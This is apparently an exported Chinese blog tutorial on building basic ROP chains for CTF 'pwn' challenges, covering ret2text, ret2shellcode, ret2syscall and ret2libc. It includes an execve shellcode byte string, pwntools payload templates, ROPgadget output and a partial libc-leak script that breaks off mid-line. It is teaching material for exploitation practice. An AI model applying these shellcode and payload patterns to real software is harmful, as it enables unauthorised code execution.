{"title":"PWN的基本ROP链构造","uid":"20032183053bd6117641c219a5d520bb","slug":"PWN的基本ROP链构造","date":"2022-05-15T10:49:36.000Z","updated":"2023-10-12T01:46:59.813Z","comments":true,"path":"api/articles/PWN的基本ROP链构造.json","keywords":null,"cover":"https://cover.png","content":"<h2 id=\"查找对应溢出\"><a href=\"#查找对应溢出\" class=\"headerlink\" title=\"查找对应溢出\"></a>查找对应溢出</h2><p>一般的溢出内容是<code>EIP</code>，因为<code>EIP</code>寄存器存储着我们<code>CPU</code>要读取指令的地址</p>\n<p>可以通过 <code>cyclic 数字</code>这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过<code>gdb</code>调试观察EIP寄存器处的 4 位字符，通过指令<code>cyclic -l 对应EIP的4位字符</code>，得到需要填充的溢出字符长度。</p>\n<h2 id=\"保护模式\"><a href=\"#保护模式\" class=\"headerlink\" title=\"保护模式\"></a>保护模式</h2><p>NX：防止栈上执行 (需要利用到 bss 段)</p>\n<p>Canary：检测是否发生栈溢出 </p>\n<h2 id=\"Ret2text\"><a href=\"#Ret2text\" class=\"headerlink\" title=\"Ret2text\"></a>Ret2text</h2><p>通过计算溢出点的地址到对应返回的栈顶（ebp）的距离来进行溢出，同时要加上对应 ret 所占的 4 个字节。</p>\n<p><strong>对应 exp 构造模式：</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">shellcode = 对应 /bin/sh/ 地址 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">payload = &#39;a&#39;*[溢出点到栈顶距离] + &#39;A&#39;*4 + p32/p64(shellcode)</span></span></code></pre></div><h2 id=\"Ret2shellcode\"><a href=\"#Ret2shellcode\" class=\"headerlink\" title=\"Ret2shellcode\"></a>Ret2shellcode</h2><p>程序中没有出现 &#x2F;bin&#x2F;sh&#x2F; 地址需要自己构造，构造方式有两种：</p>\n<ul>\n<li><p>23字节</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div></li>\n</ul>\n<p>shellcode &#x3D; “\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05”</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- 44字节</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div><p>  from pwn import *<br>  shellcode &#x3D; asm(shellcraft.sh())</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">一般实现溢出方式类似于 ret2text ，不同的是需要使用 `vmmap`检查对应的权限，同时也需要观察`bss`**（检查溢出点是否定义在 bss 段上）**</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">**对应 exp 构造模式：**</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div><p>bss &#x3D; bss对应的地址<br>shellcode &#x3D; 构造一个shell<br>payload &#x3D; shellcode.ljust(‘a’,溢出长度) + p32&#x2F;p64(bss)</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">## Ret2syscall</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">程序中同样没有出现 /bin/sh/ 地址需要自己构造，原理为把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用（知识点`Linux`下系统调用）。</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">学习链接：[ret2syscall原理详解与实例分析 ](https://www.freebuf.com/articles/system/234228.html)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">**Syscall 调用规范** `execve(“/bin/sh”, 0,0)`</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">它对应的汇编代码为：</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div><p>pop eax# 系统调用号载入， execve为0xb<br>pop ebx# 第一个参数， &#x2F;bin&#x2F;sh的string<br>pop ecx# 第二个参数，0<br>pop edx# 第三个参数，0<br>int 0x80</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">寻找对应可以利用的 `ret(gadgets)`可以使用 `ropgadgets` 这个工具</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">对应寻找步骤：</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">```sh</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> $ ROPgadget --binary 对应文件  --only &#39;pop|ret&#39; | grep &#39;eax&#39;  //search eax  </span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> 0x080bb196 : pop eax ; ret</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> ------------------------------------------------------------------------------------------------------------------</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> $ ROPgadget --binary 对应文件  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;  //search ebx\\edx\\ecx</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> ------------------------------------------------------------------------------------------------------------------</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> $ROPgadget --binary 对应文件  --string &#39;/bin/sh&#39;   //search &#39;bin/sh&#39;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    Strings information</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    ============================================================</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    0x080be408 : /bin/sh</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">  ----------------------------------------------------------------------------------------------------------------- </span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> $ROPgadget --binary 对应文件  --only &#39;int&#39;       // search int 0x80         </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    Gadgets information</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    ============================================================</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    0x08049421 : int 0x80</span></span></code></pre></div><p><strong>对应 exp 构造模式：</strong></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">pop_eax_ret </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> 可利用的 eax 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">pop_edx_ecx_ebx_ret </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> 可利用的 ebx、edx、ecx地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">int_0x80 </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">int</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">0x</span><span style=\"color: #F78C6C\">80</span><span style=\"color: #BABED8\"> 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">binsh </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">bin/sh</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">payload </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">flat</span><span style=\"color: #89DDFF\">([</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">A</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\"> 溢出长度</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> pop_eax_ret</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #C792EA\">0x</span><span style=\"color: #F78C6C\">b</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> pop_edx_ecx_ebx_ret</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> binsh</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> int_0x80</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">payload</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><h2 id=\"Ret2libc\"><a href=\"#Ret2libc\" class=\"headerlink\" title=\"Ret2libc\"></a>Ret2libc</h2><p><code>ret2libc</code> 即控制函数的执行 <code>libc (Linux下C库)</code> 中的函数，通常是返回至某个函数的 <code>PLT</code> 处或者函数的具体位置 ( 即函数对应的 got 表项的内容 )。一般情况下，我们会选择执行 <code>system(&quot;/bin/sh&quot;)</code>。</p>\n<h3 id=\"含有-system-和-bin-sh\"><a href=\"#含有-system-和-bin-sh\" class=\"headerlink\" title=\"含有 system 和 &#x2F;bin&#x2F;sh\"></a>含有 system 和 &#x2F;bin&#x2F;sh</h3><p><strong>一般函数中含有 <code>/bin/sh</code> 、<code>system</code> 函数时构造对应的 exp 构建模式为：</strong></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">binsh_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">/</span><span style=\"color: #82AAFF\">bin</span><span style=\"color: #89DDFF\">/</span><span style=\"color: #BABED8\">sh</span><span style=\"color: #89DDFF\">/</span><span style=\"color: #BABED8\"> 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">system_plt </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> system 函数的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">payload </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">flat</span><span style=\"color: #89DDFF\">([</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\"> 溢出长度</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> system_plt</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">b</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #F78C6C\">4</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">binsh_addr</span><span style=\"color: #89DDFF\">])</span></span></code></pre></div><p>需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>\n<h3 id=\"不含有-bin-sh\"><a href=\"#不含有-bin-sh\" class=\"headerlink\" title=\"不含有 &#x2F;bin&#x2F;sh\"></a>不含有 &#x2F;bin&#x2F;sh</h3><p>如果函数中不含有 <code>/bin/sh</code> 时，我们需要在<code>bss</code>段上自己构建一个<code>/bin/sh</code></p>\n<p><strong>此时 exp 构造模式为：</strong></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">system_plt </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> system 函数地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">gets_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> 溢出点函数地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">buf_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> bss 段上变量地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">payload </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">flat</span><span style=\"color: #89DDFF\">([</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\"> 溢出长度</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">gets_addr</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">system_plt</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">buf_addr</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">buf_addr</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">payload</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/bin/sh</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>对应的栈分布为：</p>\n<ul>\n<li>gets地址</li>\n<li>system地址（也是gets的返回地址）</li>\n<li>buf2（是gets的参数）</li>\n<li>buf2（是system的参数）</li>\n</ul></blockquote>\n<p>或者：</p>\n<p>寻找一个 pop：</p>\n<div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">ROPgadget</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--binary</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ret2libc2</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--only</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">pop|ret</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">grep</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">ebx</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">0x0804872c</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">pop</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ebx</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">pop</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">esi</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">pop</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">edi</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">pop</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ebp</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">ret</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">0x0804843d</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">pop</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ebx</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">ret</span></span></code></pre></div><p><strong>之后的 exp 构造模式：</strong></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">system_plt </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> system 函数地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">pop_ebx </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> ret ebx 的地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">gets_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> 溢出点函数地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">buf_addr </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> bss 段上变量地址</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">payload </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">flat</span><span style=\"color: #89DDFF\">([</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\"> 溢出长度</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">gets_addr</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">pop_ebx</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">system_plt</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">A</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #F78C6C\">4</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">buf_addr</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">payload</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendline</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/bin/sh</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>对应的栈分布为：</p>\n<ul>\n<li>gets地址</li>\n<li>pop ebx ；ret地址</li>\n<li>buf2（gets的参数）</li>\n<li>system地址</li>\n<li>system的返回地址（’AAAA’）</li>\n<li>buf2（system的参数）</li>\n</ul></blockquote>\n<p>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system。</p>\n<h3 id=\"不含有-System-和-bin-sh\"><a href=\"#不含有-System-和-bin-sh\" class=\"headerlink\" title=\"不含有 System 和 &#x2F;bin&#x2F;sh\"></a>不含有 System 和 &#x2F;bin&#x2F;sh</h3><p>两个都没有给出的话需要自己寻找对应版本的 <code>libc</code></p>\n<p><strong>泄露函数地址：</strong></p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> pwn </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">process</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">./</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">elf</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">ELF</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">./</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">puts_plt </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> elf</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">plt</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">puts</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">libc_start_main_got </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> elf</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">got</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">__libc_start_main</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">main </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> elf</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">symbols</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">main</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">puts_got </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> elf</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">got</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">puts</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">leak libc_start_main_got addr and return to main again</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">payload </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span><span style=\"color: #BABED8\"> 溢出长度 </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span 